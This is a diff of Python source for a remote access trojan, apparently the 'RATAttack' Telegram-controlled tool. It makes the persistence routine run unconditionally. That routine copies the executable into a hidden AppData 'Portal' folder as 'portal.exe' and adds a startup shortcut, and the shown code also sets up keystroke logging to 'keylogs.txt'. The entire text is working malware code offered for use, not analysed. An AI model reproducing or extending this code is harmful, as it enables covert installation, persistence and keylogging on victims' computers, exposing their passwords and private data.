@@ -38,27 +38,22 @@ functionalities = { '/capture_pc' : '', \
 					'/to':'<target_computer>, [other_target_computer]'}
 def checkchat_id(chat_id):
 	return len(known_ids) == 0 or str(chat_id) in known_ids
-if (argv[0]).endswith('.exe'):
-	appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
-	# HIDING OPTIONS
-	# ---------------------------------------------
-	hide_folder = appdata_roaming_folder + r'\Portal'	# = 'C:\Users\Username\AppData\Roaming\Portal'
-	compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
-	# ---------------------------------------------
-	target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
-	if not os.path.exists(hide_folder):
-		os.makedirs(hide_folder)
-		hide_compiled = hide_folder + '\\' + compiled_name
-		copyfile(argv[0], hide_compiled)
-		shell = Dispatch('WScript.Shell')
-		shortcut = shell.CreateShortCut(target_shortcut)
-		shortcut.Targetpath = hide_compiled
-		shortcut.WorkingDirectory = hide_folder
-		shortcut.save()
-else:
-	hide_folder = path[0] + '\\RATAttack'
-	if not os.path.exists(hide_folder):
-		os.makedirs(hide_folder)
+appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
+# HIDING OPTIONS
+# ---------------------------------------------
+hide_folder = appdata_roaming_folder + r'\Portal'	# = 'C:\Users\Username\AppData\Roaming\Portal'
+compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
+# ---------------------------------------------
+target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
+if not os.path.exists(hide_folder):
+	os.makedirs(hide_folder)
+	hide_compiled = hide_folder + '\\' + compiled_name
+	copyfile(argv[0], hide_compiled)
+	shell = Dispatch('WScript.Shell')
+	shortcut = shell.CreateShortCut(target_shortcut)
+	shortcut.Targetpath = hide_compiled
+	shortcut.WorkingDirectory = hide_folder
+	shortcut.save()
 initi = False
 user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
 log_file = hide_folder + '\\keylogs.txt'
